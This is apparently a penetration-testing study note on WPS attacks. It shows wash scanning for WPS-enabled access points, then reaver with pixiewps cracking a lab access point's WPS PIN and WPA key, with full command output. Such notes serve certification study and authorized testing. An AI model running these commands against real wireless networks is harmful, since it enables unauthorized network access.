---
title: WPS
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/wps
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---
### 1. Discover

We will use a tool called *wash* to give us information about the AP, and use the wlan0mon interface with -i:

```bash
kali@kali:~$ wash -i wlan0mon
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
00:0A:D0:97:39:6F    1  -88  2.0  No   Broadcom  linksys
C8:BC:C8:FE:D9:65    2  -28  2.0  No   AtherosC  secnet
34:08:04:09:3D:38    3  -32  1.0  No   RalinkTe  wifu
```

Each row represents an AP with WPS. Wash scans the 2.4GHz band by default. To make it scan 5GHz, we can append the -5 option to the command.

### 2. Cracking PIN with Reaver + pixiewps

```bash
┌──(kali㉿kali)-[~/offsec/oswp]
└─$ sudo reaver -b F0:A7:31:46:69:71 -i wlan0 -v -K

Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[?] Restore previous session for F0:A7:31:46:69:71? [n/Y] n
[+] Waiting for beacon from F0:A7:31:46:69:71
[+] Received beacon from F0:A7:31:46:69:71
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Associated with F0:A7:31:46:69:71 (ESSID: OSWP)
executing pixiewps -e f0a48b2ed3bdda9e8479f78c8092c8043cc41c7a8ea14a0ff4cf8e85da35eb6360a5ca5e236623b569bca0ade6348a770fcfc8f581627ab60cd7e0f4050d57d1cd550784d71734c1fe0e3fac319fde2033f4f670182d461294dd4e7ce7f32674f78533803d8ba92c40ca7d39d7712f24e121675119849078d89c4e4787930fc52656f00399904c69b3439aa693c3b040a318ba4b26bbed5e1a18b0de309d47269465b2be4c8d4ebf6bed623ef245b94fdbb5574c37c9c071000c648d2e93a534 -s 45aef372fadfa2861771534f911daa82b4946ccc21c129540a4c51f0fcd22377 -z 6dbaab06317cb5c3c934c8392f762650fb693a06e9642bc82126fb99015327e4 -a 616bcd459761035b2ea303e85aa650cf2c993ed0637be95bcab3e2cd05317afe -n 90c6ed1095da4e513ae29af2308ae380 -r 98ffa54616dd67f2a5a46cae78e7d688e8e3f48fd4522106fe164bad204b3bf75e70d8eba54ef4bb586dbadcfdcea3d1349c894ee1df8befda62d223aa269d500b90be9d87bdd8fd70afb1bbecf0fb47981fb4a3521243555a1abb6c97503b2f52f684edc032f3619e4a5c07d254016a01fe361154c648b0ff9f1f88de6bfd149259831f474509768db0635b34878f350aeee4426d1140055b6a203240a0c6f707f24e467688676a5462fe649ac552a03e4ce06f6361f5955c563d839c5fbb51

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x1daadbef
 [*] Seed ES1: 0xc8dc1197
 [*] Seed ES2: 0x7a2a1aa4
 [*] PSK1:     d5824230413c9d95abd6e73e958597fe
 [*] PSK2:     d9130c524e90e23b7f4d219e62de4fbd
 [*] ES1:      8234e82d37fc0d71623f7ce5e4c833ca
 [*] ES2:      338892f828f1e50be0ca30ab4d493368
 [+] WPS pin:  44018825

 [*] Time taken: 0 s 44 ms

[+] Pixiewps: success: setting pin to 44018825
[+] WPS PIN: '44018825'
[+] WPA PSK: '44018825'
[+] AP SSID: 'OSWP'
```
